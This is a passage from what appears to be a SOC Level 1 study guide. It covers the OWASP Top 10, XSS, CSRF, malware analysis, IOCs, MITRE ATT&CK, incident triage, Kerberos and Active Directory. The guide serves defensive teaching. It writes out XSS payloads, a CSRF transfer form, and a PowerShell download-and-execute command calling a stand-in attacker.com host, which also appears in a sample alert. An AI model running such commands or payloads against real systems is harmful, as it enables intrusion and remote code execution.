    - No rate limiting on login → brute force.
    - No CSRF protection → account hijacking.
    - Weak password policy → easy guessing.
- **Mitigation**: Threat modeling, security requirements, secure design patterns.


### 5. Security Misconfiguration

- **Definition**: Insecure default settings, incomplete setups, unnecessary features.
- **Examples**:
    - Default credentials (admin/admin).
    - Unnecessary ports/services enabled.
    - Debug mode on in production.
    - Overly permissive CORS.
    - Exposed sensitive files (.git, .env, backup files).
- **Mitigation**:
    - Minimal installation (only needed software).
    - Change defaults.
    - Security scanning tools (Nessus, Qualys).
    - Infrastructure as Code with security checks.
- **SOC Detection**: Monitor for requests to common sensitive paths (/.git, /.env, /admin, /backup).


### 6. Vulnerable and Outdated Components

- **Definition**: Using libraries, frameworks, plugins with known CVEs.
- **Examples**:
    - Old version of jQuery with XSS vulnerability.
    - Outdated OpenSSL with heartbleed.
    - Unmaintained Node.js packages.
- **Mitigation**:
    - Dependency scanning (npm audit, OWASP Dependency Check).
    - Keep up-to-date; monitor CVE feeds.
    - Remove unnecessary dependencies.
- **SOC Detection**: Monitor library/software versions; cross-reference with CVE databases.


### 7. Identification and Authentication Failures

- **Definition**: Weak authentication; session management flaws.
- **Examples**:
    - Plaintext session tokens.
    - Brute-forcible login.
    - Session fixation (attacker sets user's session ID).
    - No MFA.
- **Mitigation**:
    - MFA/2FA.
    - Strong password policy + rate limiting on login.
    - Secure session management (HttpOnly, Secure, SameSite cookies).
    - Password reset via email, not security questions.
- **SOC Detection**: Monitor failed login attempts; unusual session activity; MFA bypass attempts.


### 8. Software and Data Integrity Failures

- **Definition**: Insecure CI/CD, auto-update without verification, tampering with serialized data.
- **Examples**:
    - Pulling code from untrusted sources.
    - Not verifying signatures of updates.
    - Deserialization of untrusted data (object injection).
- **Mitigation**:
    - Code signing and verification.
    - Secure CI/CD pipeline.
    - Avoid serialization of sensitive objects.
- **SOC Detection**: Monitor for code/application modifications; integrity checks.


### 9. Security Logging and Monitoring Failures

- **Definition**: Insufficient logging; no alerts; no forensics capability.
- **Examples**:
    - No login attempt logging.
    - No audit trail for sensitive operations.
    - Logs stored without integrity protection.
    - No alerting on anomalies.
- **Mitigation**:
    - Log authentication, access, data changes.
    - Centralized logging (SIEM).
    - Real-time alerting.
    - Immutable logs.
- **SOC Focus**: This is your domain! Implement logging for all vulnerabilities above; correlate logs to detect attacks.


### 10. Server-Side Request Forgery (SSRF)

- **Definition**: Attacker tricks server into making unintended requests.
- **Example**:

```
User enters URL to fetch: http://192.168.1.1/admin
Server (trusted on internal network) fetches URL.
Server returns internal admin page to attacker.
```

- **Impact**:
    - Access internal services (Redis, databases, cloud metadata).
    - Port scanning.
    - Credential harvesting.
- **Mitigation**:
    - URL validation (whitelist, blocklist internal IPs).
    - Disable HTTP redirects or limit redirects.
    - Network segmentation.

---

## XSS (Cross-Site Scripting) – Deep-Dive

### Types

#### Stored XSS (Persistent)

- **How**: Attacker injects script into database (comment, profile, post).
- **When**: Others view the page, script executes in their browser.
- **Impact**: Affects many users; long-lived.

**Example**:

- Attacker posts comment: `<script>alert('XSS')</script>`
- Comment saved in DB without sanitization.
- Every user viewing the page gets XSS'd.


#### Reflected XSS (Non-Persistent)

- **How**: Script in URL parameter; server reflects it in response.
- **When**: User clicks malicious link.
- **Impact**: Single user, requires click.

**Example**:

- Attacker crafts link: `example.com/search?q=<script>alert('XSS')</script>`
- Server returns page with script in it.
- User's browser executes script.


#### DOM-Based XSS

- **How**: Client-side JavaScript processes untrusted input unsafely.
- **When**: JavaScript modifies DOM without sanitization.

**Example**:

```javascript
// Vulnerable code
var searchTerm = location.hash.substring(1); // Get URL fragment
document.getElementById('result').innerHTML = searchTerm; // Unsafe!

// URL: example.com#<img src=x onerror="alert('XSS')">
// Script executes on page.
```


### Payload Examples

```html
<script>alert('XSS')</script>
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">
<body onload="alert('XSS')">
<iframe src="javascript:alert('XSS')">
<input onfocus="alert('XSS')" autofocus>
```


### Defense

- **Output Encoding**: Encode special characters before sending to browser.
    - `<` → `&lt;`, `>` → `&gt;`, `"` → `&quot;`
- **Input Validation**: Whitelist allowed characters.
- **CSP (Content Security Policy)**: Header limiting where scripts can come from.

```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

- **Use Frameworks**: Most modern frameworks (React, Vue, Angular) auto-encode by default.

---

## CSRF (Cross-Site Request Forgery)

### How It Works

```
1. User logs into bank.com, gets session cookie.
2. User visits attacker.com without logging out of bank.
3. attacker.com has hidden form:
   <form action="bank.com/transfer" method="POST">
     <input name="amount" value="1000000">
     <input name="to" value="attacker_account">
     <input type="submit" value="Click here">
   </form>
4. User clicks link (or auto-submits form).
5. Browser sends bank.com request WITH session cookie.
6. Bank processes transfer (user authenticated).
7. Attacker's account receives money.
```


### Why It Works

- Browser automatically includes cookies for bank.com when requesting bank.com.
- Bank sees valid session → assumes request is legitimate.
- No way to distinguish user-initiated request from attacker's site.


### Defense

- **CSRF Tokens**: Server generates unique token; form includes it.
    - Attacker can't predict token (not in cookie).
    - Server verifies token before processing.
- **SameSite Cookie**: Browser doesn't send cookie for cross-site requests.

```
Set-Cookie: sessionid=...; SameSite=Strict
```

- **Referer Check**: Verify request came from your domain.

---

## Open Redirects

### What \& How

- **Vulnerability**: App redirects to user-supplied URL without validation.
- **Example**:

```
https://bank.com/logout?redirect_to=https://evil.com
Server: redirect user to redirect_to parameter.
Result: User redirected to evil.com after logout.
```


### Attack Scenario

1. Attacker crafts: `bank.com/logout?redirect_to=phishing.evil.com`
2. Attacker sends link in phishing email: "Click to log out securely."
3. User clicks, logs out from legitimate bank.com.
4. User redirected to phishing.evil.com (looks like bank.com).
5. User re-enters credentials into phishing site.

### Defense

- **Whitelist**: Only allow redirects to known URLs.

```
allowed_redirects = ['/', '/home', '/dashboard']
if redirect_to not in allowed_redirects:
    return error
```

- **URL Validation**: Ensure URL is same-origin.

```python
from urllib.parse import urlparse
parsed = urlparse(redirect_to)
if parsed.netloc != request.host:
    return error
```

- **Relative URLs Only**: Allow `/path` but not `//` or `http://`.

---

# 7. MALWARE \& THREAT ANALYSIS

## Malware Classification

### By Execution Method

- **Virus**: Requires host file; spreads by modifying files.
- **Worm**: Self-replicating; spreads via network without host.
- **Trojan**: Masquerades as legitimate; user-triggered installation.
- **Ransomware**: Encrypts files; demands payment for decryption.
- **Rootkit**: Hides itself in OS kernel; maintains persistence.
- **Spyware**: Monitors user activity; exfiltrates data.
- **Adware**: Displays unwanted ads; may redirect browsers.


### By Persistence Mechanism

- **File-based**: Registry modifications (Windows), config files (Linux).
- **Scheduled Tasks**: Cron jobs (Linux), Task Scheduler (Windows).
- **Startup Folders**: Auto-run on boot.
- **Browser Hijacking**: Modifies homepage, search engine.
- **Kernel Rootkits**: Loads kernel module (harder to detect).

---

## Malware Analysis (SOC L1 Level)

### Dynamic Analysis (Behavioral)

- **What**: Run malware in isolated environment (sandbox); observe behavior.
- **Tools**: Cuckoo Sandbox, ANY.RUN, Hybrid Analysis.
- **Observables**:
    - **File Operations**: Creates, modifies, deletes files (especially system dirs, registry).
    - **Network**: DNS queries, connections to IPs/domains, beaconing (periodic callback).
    - **Process**: Spawns child processes, injects code, escalates privileges.
    - **Registry** (Windows): Modifies Run keys, disables antivirus, hides files.
    - **API Calls**: Calls to system functions (e.g., CreateRemoteThread for injection).


### Static Analysis (Code-Level)

- **What**: Examine malware without running (disassembly, decompilation).
- **Tools**: IDA Pro, Ghidra (free), Radare2, Binary Ninja.
- **Limitations for SOC L1**: Requires reverse engineering skills; time-consuming; often tool-expensive.
- **Practical Approach**: Use hashes, strings extraction, yara rules instead.


### String Extraction (Quick-Win for L1)

- **How**: Extract readable strings from binary.
- **What to look for**:
    - C2 domains/IPs.
    - Filenames (C:\Windows\Temp\malware.exe).
    - Registry paths.
    - Error messages ("Failed to connect to C2").
    - Mutexes (unique name to prevent reinfection).

**Example**:

```bash
strings malware.exe | grep -E "\.com|\.net|http|C:\\"
```

**Output**:

```
http://attacker.com:8080/beacon
C:\Windows\System32\svchost.exe
mutex_unique_id_12345
```


---

## IOCs (Indicators of Compromise)

### Types

| IOC | Example | Use |
| :-- | :-- | :-- |
| **File Hash** | MD5, SHA-256 of malware | Identify known malware |
| **IP Address** | 192.168.1.100 (C2 server) | Block C2 communication |
| **Domain/URL** | attacker.com, bit.ly/malware | Block via DNS/firewall; phishing detection |
| **File Path** | C:\Windows\Temp\malware.exe | Hunt for infection on endpoints |
| **Registry Key** | HKLM\Software\Microsoft\Windows\Run | Detect persistence mechanisms |
| **Email Header** | From: attacker@phishing.com | Filter phishing emails |
| **Mutex** | Global\UniqueID12345 | Identify malware variant |
| **User Agent** | Mozilla/5.0 (BadBot) | Identify malicious scanners |
| **Port** | 4444 (Metasploit default) | Detect C2 beaconing |
| **Process Name** | svchost.exe (from wrong location) | Identify process impersonation |

### IOC Sources (OSINT)

- **Public Feeds**: AlienVault OTX, Abuse.ch, Shodan, VirusTotal.
- **Commercial**: CrowdStrike, Mandiant, Proofpoint threat intel.
- **Internal**: Your own SIEM logs, Splunk, Microsoft Sentinel.


### Using IOCs in SOC

**Example Scenario**:

```
Alert: File hash aaabbbcccddd created on endpoint.
Step 1: Look up hash in VirusTotal.
Result: 45 antivirus engines flag as Trojan.GenericDR.
Step 2: Extract IOCs from malware report:
  - C2: attacker-c2.com
  - Port: 4444
  - Regex pattern: process spawning cmd.exe from Temp
Step 3: Hunt for other indicators:
  - Search SIEM for other files with same hash.
  - Search for connections to attacker-c2.com.
  - Search for processes matching regex.
Step 4: Escalate; quarantine all infected endpoints.
```


---

## Living-off-the-Land (LoTL) Attacks

### What \& Why

- **Definition**: Attacker uses built-in system tools (PowerShell, cmd.exe, WMI, psexec) instead of malware.
- **Advantage**: Bypasses signature-based detection (tools are legitimate).
- **Challenge for SOC**: Distinguish legitimate sysadmin activity from attack.


### Common LoTL Tools

| Tool | OS | Use |
| :-- | :-- | :-- |
| **PowerShell** | Windows | Script execution, lateral movement, credential theft |
| **cmd.exe** | Windows | Command execution |
| **WMI** (wmic) | Windows | Remote execution (WMI event subscriptions for persistence) |
| **psexec** | Windows | Remote command execution |
| **at.exe** / **schtasks** | Windows | Scheduled tasks (persistence) |
| **net.exe** | Windows | Network enumeration, user/group management |
| **certutil.exe** | Windows | Download files, encode/decode (file transfer) |
| **bitsadmin** | Windows | Download files (lives in \System32) |
| **curl/wget** | Linux | Download files, reverse shells |
| **bash** | Linux | Script execution, reverse shells |
| **ssh** | Linux/Mac | Remote access, tunneling |
| **cron** | Linux | Persistence (scheduled tasks) |

### Real Attack Example: PowerShell LoTL

```powershell
# Attacker executes (legitimate-looking):
powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"

# What it does:
# 1. IEX = Invoke-Expression (execute downloaded code).
# 2. Downloads script from attacker server.
# 3. Executes payload (e.g., create backdoor account, lateral movement).

# Detection challenge:
# - PowerShell is legitimate Windows tool.
# - Sysadmins use it for legitimate scripts.
# - Attacker blends in with normal admin activity.
```


### Detection Strategies (SOC Level 1)

1. **Monitor PowerShell Command Line**: Log all executions (Windows Event ID 4688).
2. **Look for Suspicious Patterns**:
    - IEX (Invoke-Expression).
    - DownloadString / WebClient.
    - Base64 encoding (obfuscation).
    - Credential theft (Get-Content, Invoke-Mimikatz).
3. **Whitelisting**: Maintain list of approved scripts; alert on unknown.
4. **Behavioral Analysis**: PowerShell rarely needs network access (legitimate scripts usually read local files).

---

# 8. ATTACK FRAMEWORKS (KILL CHAIN, MITRE, PYRAMID OF PAIN)

## Cyber Kill Chain (Lockheed Martin)

### 7 Stages

```
1. RECONNAISSANCE
   ↓ (attacker studies target)
2. WEAPONIZATION
   ↓ (attacker prepares payload)
3. DELIVERY
   ↓ (attacker sends payload to target)
4. EXPLOITATION
   ↓ (payload activates, vulnerability exploited)
5. INSTALLATION
   ↓ (malware/backdoor installed for persistence)
6. COMMAND & CONTROL (C2)
   ↓ (attacker establishes communication)
7. ACTIONS ON OBJECTIVES
   ↓ (attacker achieves goals: exfiltrate, encrypt, etc.)
```


### Stage-by-Stage Breakdown

#### 1. Reconnaissance

- **Definition**: Attacker gathers info on target (OSINT).
- **Techniques**:
    - WHOIS lookup (domain registration).
    - Social media stalking (employee info, weak passwords).
    - Shodan search (exposed services).
    - DNS enumeration (subdomains, mail servers).
    - Port scanning (nmap).
- **SOC Mitigation**: Monitor for unusual external scanning; restrict OSINT data exposure.


#### 2. Weaponization

- **Definition**: Attacker creates exploit/payload.
- **Examples**:
    - Malware binary.
    - Phishing email with malicious attachment.
    - Exploit kit for unpatched software.
    - ROP gadgets (return-oriented programming for bypass).
- **SOC Mitigation**: Endpoint protection; antivirus scanning.


#### 3. Delivery

- **Definition**: Attacker sends weaponized payload to target.
- **Methods**:
    - Email (phishing).
    - Website drive-by (watering hole).
    - USB/removable media (physical).
    - Software supply chain (update servers).
    - C2 download.
- **SOC Mitigation**: Email filtering; web proxy; block known malware domains; sandbox suspicious files.


#### 4. Exploitation

- **Definition**: Payload executes; vulnerability triggered.
- **Examples**:
    - PDF reader vulnerability → code execution.
    - SQL injection → database access.
    - Phishing click → browser malware.
    - Zero-day in unpatched OS.
- **SOC Mitigation**: Patch management; EDR (detects suspicious execution); application whitelisting.


#### 5. Installation

- **Definition**: Malware/backdoor installed; persistence achieved.
- **Persistence Mechanisms**:
    - Registry Run key (Windows).
    - Cron job (Linux).
    - Scheduled Task.
    - Service creation.
    - Rootkit (kernel-level).
    - Web shell (web server backdoor).
- **SOC Mitigation**: Monitor registry/file changes; detect new services/tasks; FIM (file integrity monitoring).


#### 6. Command \& Control (C2)

- **Definition**: Attacker establishes remote communication; sends commands.
- **C2 Methods**:
    - Direct connection (IP:Port).
    - DNS tunneling.
    - HTTP/HTTPS beaconing.
    - P2P networks.
    - Encrypted channels (to avoid detection).
- **Patterns**:
    - Periodic "beacon" (callback to C2 every X seconds).
    - Large outbound data transfer (exfiltration).
    - Unusual destination IPs/domains.
- **SOC Mitigation**: Network monitoring; block known C2; DNS filtering; identify beaconing patterns (SIEM correlation).


#### 7. Actions on Objectives

- **Definition**: Attacker achieves goals.
- **Examples**:
    - Data exfiltration (steal files).
    - Data destruction (wipe drives).
    - Encryption (ransomware).
    - Lateral movement (pivot to other systems).
    - Privilege escalation (domain admin access).
- **SOC Mitigation**: DLP (data loss prevention); behavioral analysis; incident response.

---

## MITRE ATT\&CK Framework

### What It Is

- **Definition**: Comprehensive knowledge base of adversary tactics, techniques, procedures (TTPs) based on real-world attacks.
- **URL**: https://attack.mitre.org
- **Use**: Organize threats, plan defenses, attribute attacks, build threat intelligence.


### Structure

```
Tactics (what is the attacker trying to achieve?)
  └─ Techniques (how do they do it?)
      └─ Sub-techniques (specific variations)
```


### 14 Tactics (Simplified)

| Tactic | Goal | Examples |
| :-- | :-- | :-- |
| **Reconnaissance** | Gather info | OSINT, scanning, social engineering |
| **Resource Development** | Acquire tools | Create C2 server, register domain, acquire phishing hosting |
| **Initial Access** | Enter network | Phishing, exploit public-facing app, supply chain compromise |
| **Execution** | Run code | PowerShell, script execution, macro |
| **Persistence** | Stay in system | Registry Run key, scheduled task, webshell |
| **Privilege Escalation** | Gain higher access | UAC bypass, kernel exploit, sudo misconfig |
| **Defense Evasion** | Hide activity | Obfuscation, signing malware, disabling logging |
| **Credential Access** | Steal login info | Password spray, credential dumping (Mimikatz), keylogging |
| **Discovery** | Learn about system | Network shares, process listing, software enumeration |
| **Lateral Movement** | Move to other systems | Pass-the-hash, RDP with stolen creds, exploit internal service |
| **Collection** | Gather data | Screen capture, keylogging, email forwarding |
| **Command \& Control** | Remote access | Beaconing, DNS tunneling, encrypted channels |
| **Exfiltration** | Steal data | Data transfer to C2, cloud upload, removable media |
| **Impact** | Final goal | Encrypt files (ransomware), delete backups, system shutdown |

### Real-World Example: Phishing Campaign (MITRE Mapping)

**Scenario**: Employee receives phishing email with malicious Excel file.

```
Tactic: Reconnaissance
  Technique: Phishing for Information (harvest employee names from LinkedIn)

Tactic: Resource Development
  Technique: Acquire Infrastructure (set up attacker.com)
  Technique: Develop Capabilities (craft macro payload)

Tactic: Initial Access
  Technique: Phishing (send malicious Excel email)

Tactic: Execution
  Technique: Command and Scripting Interpreter (Excel macro runs PowerShell)

Tactic: Persistence
  Technique: Registry Run Key (add malware to HKCU\...\Run)

Tactic: Defense Evasion
  Technique: Obfuscated Files (base64-encode PowerShell command)

Tactic: Credential Access
  Technique: Password Spraying (try common passwords)

Tactic: Lateral Movement
  Technique: Pass-the-Hash (steal hashes, move to domain controller)

Tactic: Command & Control
  Technique: Application Layer Protocol (HTTP POST beacons)

Tactic: Exfiltration
  Technique: Exfiltration Over C2 Channel (send stolen files to attacker server)

Tactic: Impact
  Technique: Data Encrypted for Impact (ransomware encryption)
```


### SOC Use (TryHackMe SOC L1 Focus)

1. **Mapping Alerts**: When you see alert, map it to tactic/technique.
    - Alert: "PowerShell with IEX" → Tactic: Execution; Technique: PowerShell scripting.
2. **Threat Intelligence**: IOCs/TTPs from threat intel → cross-reference MITRE.
3. **Response Planning**: For each technique, define detection/response.
4. **Hunting**: Search SIEM for techniques you know are high-risk (e.g., Pass-the-Hash).

---

## Pyramid of Pain

### Concept

- **Bottom (Easiest to Change)**: Attacker easily changes (hashes, IPs).
- **Top (Hardest to Change)**: Attacker's TTP, tools, infrastructure deeply linked to identity/operations.


### Levels (Bottom to Top)

```
       TACTICS, TECHNIQUES, PROCEDURES (TTP)
                     ↑
              MALWARE TOOLS
                     ↑
           ATTACK PATTERNS
                     ↑
                 DOMAINS
                     ↑
              IPs & PORTS
                     ↑
           FILE HASHES (MD5)
```


### Details

#### 1. File Hashes (Hash Values)

- **Effort to Change**: Trivial (recompile, add byte of junk).
- **Detection Power**: Low (changes every variant).
- **Use**: Quick blocklist, not strategic.
- **Example**: Block malware.exe (MD5: abc123), but attacker releases malware.exe (MD5: xyz789).


#### 2. IPs \& Ports

- **Effort to Change**: Easy (use different server, rotate IPs).
- **Detection Power**: Medium (narrows attack vector).
- **Use**: Block IP; attacker finds new hosting.
- **Example**: Block 192.168.1.100; attacker moves C2 to 10.0.0.50.


#### 3. Domains

- **Effort to Change**: Medium (need new domain registration, DNS setup).
- **Detection Power**: Medium-High (domain ties to attacker identity).
- **Use**: Block domain + look for similar typos.
- **Example**: Block attacker-c2.com; attacker registers attacker-c3.com (similar pattern).


#### 4. Attack Patterns

- **Effort to Change**: Medium-High (requires relearning/retooling).
- **Detection Power**: High (identifies specific attacker operations).
- **Use**: Hunt for similar patterns across your environment.
- **Example**: Attacker always uses PowerShell + base64 + IEX. Hunt for that pattern; catch variants.


#### 5. Malware Tools

- **Effort to Change**: High (tools deeply integrated into operations, years to develop).
- **Detection Power**: Very High (identifies attacker's toolkit).
- **Use**: YARA rules for tool families; track tool evolution.
- **Example**: Cobalt Strike beacon tool. Detect via beacon behavior + memory signature.


#### 6. TTPs (Tactics, Techniques, Procedures)

- **Effort to Change**: Very High (fundamental to attacker's methodology; reflects skill, experience, training).
- **Detection Power**: Highest (identifies threat actor, not just campaign).
- **Use**: Attribution; long-term defense.
- **Example**: APT28 favors spear-phishing + exploiting unpatched IIS. Changes tools, domains, IPs, but TTP pattern persists.


### Implications for SOC L1

**Invest in TTP Detection** → More sustainable than hash blocking.

**Example Defense Strategy**:

```
Level 1 (Reactive):
  Block known file hashes, IPs, domains.
  
Level 2 (Proactive):
  Hunt for known attack patterns (command line, registry changes).
  
Level 3 (Strategic):
  Monitor for TTPs (spear-phishing + exploitation + lateral movement).
  Link multiple campaigns to same threat actor.
  Plan long-term defenses around their preferences.
```


---

# 9. INCIDENT RESPONSE \& SOC OPERATIONS

## Incident Response Phases (NIST)

### 1. Preparation

- **Goal**: Ready defenses before incident occurs.
- **Activities**:
    - Deploy EDR, SIEM, logging.
    - Create playbooks for common incidents.
    - Train SOC team.
    - Establish communication channels.
    - Backup critical systems.
- **SOC L1 Role**: Understand your tools (SIEM queries, EDR capabilities).


### 2. Detection and Analysis

- **Goal**: Identify incident; gather initial info.
- **Activities**:
    - Monitor alerts.
    - Triage (is this real? what severity?).
    - Collect logs, artifacts.
    - Timeline creation.
    - Hypothesis formation.
- **SOC L1 Core Activity**: Triage, initial investigation, escalation.


### 3. Containment

- **Goal**: Stop spread; limit damage.
- **Short-term**: Isolate affected system from network.
- **Long-term**: Patch vulnerability, update firewall rules.
- **SOC L1 Role**: Alert escalation team; may assist with isolation.


### 4. Eradication

- **Goal**: Remove attacker access; eliminate malware.
- **Activities**:
    - Remove backdoors, malware.
    - Patch vulnerabilities.
    - Force password reset.
    - Update firewall/network rules.
- **SOC L1 Role**: Collect evidence; support forensics team.


### 5. Recovery

- **Goal**: Restore systems to normal.
- **Activities**:
    - Restore from clean backups.
    - Rebuild systems.
    - Restore data.
    - Validate integrity.
- **SOC L1 Role**: Monitor for re-infection during recovery.


### 6. Post-Incident Activities

- **Goal**: Learn; improve.
- **Activities**:
    - Root cause analysis.
    - Document lessons learned.
    - Update procedures.
    - Share threat intel.
- **SOC L1 Role**: Contribute observations; suggest improvements.

---

## SOC Triage Workflow

### Step 1: Alert Received

```
SIEM Alert: "PowerShell with IEX Detected"
  - Alert Title
  - Timestamp: 2024-01-15 14:32:00 UTC
  - Severity: High
  - Source IP: 192.168.1.100 (workstation)
  - Event ID: 4688 (Process Creation)
  - Command: powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload')"
```


### Step 2: Contextualize

```
Questions to Ask:
1. Is source IP known? Check inventory.
   → 192.168.1.100 = John_Workstation (marketing dept).
   
2. Is user John expected to use PowerShell?
   → Marketing role, typically uses email/Office. PowerShell unusual.
   
3. When was this activity?
   → 2:32 PM on workday. John working hours (plausible).
   
4. Any related alerts on this host?
   → 15 failed logins from 192.168.1.100 in last hour (brute force!).
   → File created: C:\Temp\malware.exe.
```


### Step 3: Severity Assessment

```
Factors:
- Suspicious command (IEX = code execution): HIGH RISK.
- Brute force attempt preceding activity: Indicates compromise.
- Attacker C2 domain in command: Confirmed malicious.
- Financial data access possible from workstation: HIGH IMPACT.

Severity: CRITICAL.
```


### Step 4: Initial Action

```
Immediate:
- Isolate workstation from network.
- Block attacker C2 domain at firewall.
- Alert user (avoid panic).
- Notify manager.
- Create incident ticket.

Investigation:
- Check EDR data (process tree, network connections, file access).
- Check logs from network appliances (firewall, proxy).
- Identify compromised user account.
- Search SIEM for similar activity on other hosts.
```


### Step 5: Escalation

```
Escalate to:
- Incident Response Team (full investigation).
- Security Engineer (policy/rule updates).
- Management/Legal (regulatory requirements, communication).
- Affected Users (password reset, device cleanup).
```


---

## Common SOC L1 Alerts \& Handling

### 1. Brute Force Login Attempts

**Alert**: Multiple failed logins from external IP.

**Triage**:

- Is IP on known VPN? → Legitimate (likely user forgot password).
- Is IP from company's usual location? → Likely legitimate.
- Is account a service account? → Check if auto-retry (legitimate).
- Any successful login after failures? → Compromise suspected.

**Action**: Lock account; force password reset; notify user.

### 2. Suspicious File Created in System Directory

**Alert**: C:\Windows\Temp\malware.exe created.

**Triage**:

- Is process creator known? (Check parent process)
- Is file signed? (Check digital signature)
- Does file hash match known malware?
- Does file trigger EDR alert?

**Action**: Quarantine file; scan host; investigate parent process.

### 3. Unusual Outbound Network Connection

**Alert**: Workstation connecting to 192.0.2.1:443 (high-risk IP).

**Triage**:

- What process initiated connection?
- Is destination IP on blocklist?
- Is destination IP hosting known malware?
- Is traffic encrypted (normal HTTPS) or abnormal protocol?

**Action**: Block destination; investigate process; check for beaconing pattern.

### 4. Large Data Transfer

**Alert**: User downloaded 5 GB from file server to USB.

**Triage**:

- Is user authorized for this data? (Check job role)
- Is transfer unusual for this user? (Baseline)
- What files transferred? (Sensitive?)
- Where is USB? (User still has it?)

**Action**: Quarantine user's device; retrieve USB; investigate data leakage intent.

---

# 10. AUTHENTICATION \& ACCESS CONTROL (MFA, KERBEROS, OAUTH)

## MFA (Multi-Factor Authentication)

### Factors of Authentication

1. **Knowledge** (something you know): Password, PIN, security question.
2. **Possession** (something you have): Hardware token, phone, smart card.
3. **Inherence** (something you are): Fingerprint, face, iris.
4. **Location/Context** (where/when): IP range, time window, device.

### MFA Methods

- **Password + SMS OTP**: User knows password; SMS sends one-time code.
- **Password + Hardware Token**: User knows password; token generates code (TOTP/HOTP).
- **Password + Push Notification**: User knows password; phone app confirms login.
- **Biometric + Possession**: Fingerprint + smart card.
- **Context-based**: Risk score triggers additional factor.


### Security Benefits

- **Defense Against Phishing**: Attacker steals password; still needs phone/token.
- **Defense Against Brute Force**: Attacker can't guess OTP (time-limited).
- **Defense Against Credential Stuffing**: Even if password leaked in breach, MFA blocks access.


### Challenges \& Attacks

- **SIM Swap**: Attacker convinces carrier to transfer phone number; receives SMS codes.
    - Defense: Don't use SMS for sensitive accounts; use app-based OTP or hardware tokens.
- **Phishing MFA Codes**: Attacker's site accepts login; prompts for MFA code; passes code to real site.
    - Defense: Educate users; use U2F/WebAuthn (hardware key) instead of code-based.
- **MFA Fatigue**: Users constantly approve notifications; attacker sends many; user approves one accidentally.
    - Defense: Limit approval notifications; use passwordless auth.

---

## Kerberos (Network Authentication Protocol)

### Background

- **Use**: Microsoft Active Directory (Windows domains); Linux with krb5.
- **Alternative**: NTLM (older, weaker; Kerberos preferred).
- **Trust Model**: Central authority (KDC) vouches for user identity.


### Key Concepts

#### KDC (Key Distribution Center)

- Trusted server holding user/computer password hashes.
- **AS** (Authentication Server): Issues TGT (proof of login).
- **TGS** (Ticket Granting Server): Issues service tickets (access to resource).


#### TGT (Ticket-Granting Ticket)

- Proof user authenticated to domain.
- Obtained after password entry; cached locally.
- Expires (default 10 hours).


#### Service Ticket

- Proof user authorized for specific service (file share, email, etc.).
- Obtained from TGS; sent to service.
- Service validates ticket; grants access.


### Kerberos Flow (Simplified)

```
USER (john@ACME.COM)
    ↓ [Step 1: Send username/password hash]
KDC/AS (Authentication Server)
    ↓ [Step 2: Verify hash; send TGT (encrypted with KDC secret)]
    ↓
USER (caches TGT)
    ↓ [Step 3: User wants to access file server; sends TGT to TGS]
KDC/TGS (Ticket Granting Server)
    ↓ [Step 4: Verify TGT; send service ticket (encrypted with file server secret)]
    ↓
FILE SERVER
    ↓ [Step 5: User presents service ticket; server decrypts; grants access]
    ↓
USER accesses files.
```


### Kerberos Attacks (SOC L1 Awareness)

#### Pass-the-Ticket (PTT)

- **Attack**: Attacker steals TGT from one user's machine; uses it to impersonate that user.
- **How**: Tools like Mimikatz extract TGT; apply to attacker's process.
- **Detection**: Unusual ticket usage (different source IP).


#### Golden Ticket

- **Attack**: Attacker obtains KDC secret; forges TGT for any user.
- **Impact**: Permanent domain access (even after password reset).
- **Detection**: Very hard; requires log analysis of ticket inconsistencies.


#### Kerberoasting

- **Attack**: Attacker requests service ticket for service account; cracks password offline.
- **How**: Service account passwords often weak (set once, forgotten).
- **Detection**: Monitor for requests for unusual service tickets.


### Defense

- **Enforce Strong Passwords**: Service accounts too.
- **Regular Audits**: Find orphaned/unused accounts.
- **Monitor Ticket Usage**: Alert on pass-the-ticket patterns.
- **Privilege Access Management (PAM)**: Restrict who can access sensitive accounts.

---

## OAuth 2.0 (Authorization, not Authentication)

### Purpose

- **Use**: Allow 3rd-party apps to access user data (without sharing password).
- **Example**: Login with Google; Google authorizes app to access your calendar.


### Flow

```
USER
  ↓ [Clicks "Login with Google"]
APP (3rd-party)
  ↓ [Redirects user to Google]
GOOGLE (Authorization Server)
  ↓ [User enters Google password]
  ↓ [User authorizes app to access calendar]
  ↓ [Google sends authorization code back to app]
GOOGLE → APP (authorization code)
  ↓
APP [Server-side: exchanges code for access token]
GOOGLE → APP (access token)
  ↓
APP [Uses token to access user's calendar on behalf of user]
GOOGLE (grants calendar access to app)
  ↓
USER (logged in; calendar shared with app)
```


### Security Notes

- **Not Authentication**: OAuth doesn't verify user identity (doesn't replace password).
- **Phishing Risk**: Attacker redirects user to fake Google login; steals OAuth code.
- **Token Leakage**: If app's access token stolen, attacker accesses user's Google data.

---

# 11. ACTIVE DIRECTORY DEEP-DIVE

## What is AD (Active Directory)?

- **Purpose**: Centralized directory of network resources (users, computers, groups, policies).
- **OS**: Windows domain environments.
- **Authentication**: Kerberos (primary) + NTLM (legacy).
- **Management**: Group Policy Objects (GPOs) distribute configs.

---

## AD Objects

### User Objects

- **Attributes**: Username, password hash, email, department, manager, group memberships.
- **Authentication**: Credentials used for login.
- **Risks**:
    - Weak password.
    - Credential theft (phishing, malware).
    - Privilege escalation (user to admin).
    - Lateral movement (user's credentials used on other systems).

**SOC L1 Relevance**: Monitor for failed logins (brute force), unusual login locations, access to sensitive resources.

### Computer Objects

- **Attributes**: Computer name, OS, IP address, last login, security group memberships.
- **Risk**: Unpatched systems vulnerable to malware.

**SOC L1 Relevance**: Inventory outdated systems; cross-reference with malware detections.

### Group Objects

- **Types**: **Security Groups** (access control), **Distribution Groups** (email lists).
- **Membership**: Define who can access resources.
- **Example**: "Finance_Read_Access" group → users in group read financial files.

**SOC L1 Relevance**: Monitor group membership changes; detect privilege escalation via group modification.

### OU (Organizational Unit)

- **Purpose**: Hierarchy of users/computers; target for GPO application.
- **Example Structure**:

```
ACME.COM
  └─ Finance
  └─ Marketing
  └─ IT
      └─ Servers
      └─ Workstations
```


**SOC L1 Relevance**: Understand org structure; tailor alerts by OU.

### GPO (Group Policy Object)

- **Purpose**: Centrally manage settings (security policies, software deployment, etc.).
- **Examples**:
    - Enforce password length (e.g., minimum 14 characters).
    - Disable USB drives.
    - Deploy antivirus to all computers.
    - Enforce screen lock after 5 minutes.

**SOC L1 Relevance**: Know your org's policies; flag deviations (disabled AV, USB enabled unexpectedly).

---

## AD Authentication Methods

